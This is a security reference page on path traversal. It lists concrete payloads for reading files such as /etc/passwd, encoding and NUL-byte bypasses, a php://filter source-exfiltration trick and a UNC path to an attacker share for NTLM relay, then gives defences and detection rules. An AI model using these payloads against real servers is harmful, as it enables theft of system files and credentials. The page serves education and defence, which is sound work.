---
title: Path traversal
slug: path-traversal
---

> **TL;DR:** ../ navigates out of the intended directory. Encoding, double encoding, and unicode tricks.

## What it is
A file/path parameter is concatenated into a filesystem path without containment. The classic primitive `../` walks up the directory tree until it reaches a target file outside the intended root. Variants exploit URL/UTF-8/UTF-16 encoding, NUL terminators, OS-specific separators, and case folding to defeat naive sanitisers.

## Preconditions / where it applies
- An endpoint that maps a request parameter to a filename: download, view, thumbnail, log-tail, template loader
- Path concatenation without normalisation + containment check
- Process has read (or write) access to the target file

## Technique
1. **Baseline** — `?file=../../../../etc/passwd` or `?file=..\..\..\..\windows\win.ini`.
2. **Single-encoded** — `%2e%2e%2f`, `%2E%2E%2F`.
3. **Double-encoded** — `%252e%252e%252f` (server URL-decodes once, then path code decodes again).
4. **Mixed separators** — `..%2f..%5c..%2f` on Windows; `..//`, `....//`, `..\/`.
5. **Sanitiser-stripping bypass** — if `../` is removed once non-recursively: `....//` becomes `../` after strip.
6. **NUL truncation** — `?file=../../etc/passwd%00.jpg` defeats extension allowlists on PHP/Java < fixed versions.
7. **Absolute path** — some servers accept `?file=/etc/passwd` directly (no traversal needed).
8. **UNC / SMB** — Windows: `?file=\\attacker\share\evil.txt` triggers outbound auth (NTLM relay opportunity).
9. **Unicode overlong / homoglyph** — `%c0%ae%c0%ae/` (overlong UTF-8 for `..`) on legacy decoders.
10. **Wrapper schemes** in PHP — `php://filter/convert.base64-encode/resource=index.php` exfils source; chain with [[lfi-rfi]].
11. **Archive extraction** (zip-slip) — entry names containing `../` write outside the destination; classic on Java/Node/Go tar/zip libs.

Detection signal: response leaks file contents or shows different errors for "file not found" vs "permission denied" — usable as a boolean oracle.

## Detection and defence
- Resolve the path: `realpath(joined)`, then assert it starts with `realpath(baseDir) + separator`. Reject otherwise.
- Use opaque identifiers, not filenames, in user input; map id → server-side path table.
- Drop privileges; the file-serving process should not be able to read `/etc/shadow`, app secrets, etc.
- For archive extraction, validate every entry's resolved path before writing.
- WAF rules for `../`, `..%2f`, `..%5c`, but treat as defence-in-depth — bypasses are well-known.
- Log requests touching files outside expected roots; alert on `/etc/`, `\windows\`, `.ssh/`, `.aws/`.
- Related: [[lfi-rfi]], [[file-upload]], [[ssrf]], [[canonicalization-attacks]].

## References
- [PortSwigger — path traversal](https://portswigger.net/web-security/file-path-traversal) — labs and bypass list
- [OWASP — path traversal](https://owasp.org/www-community/attacks/Path_Traversal) — taxonomy
- [Snyk — zip slip](https://snyk.io/research/zip-slip-vulnerability) — archive-extraction variant
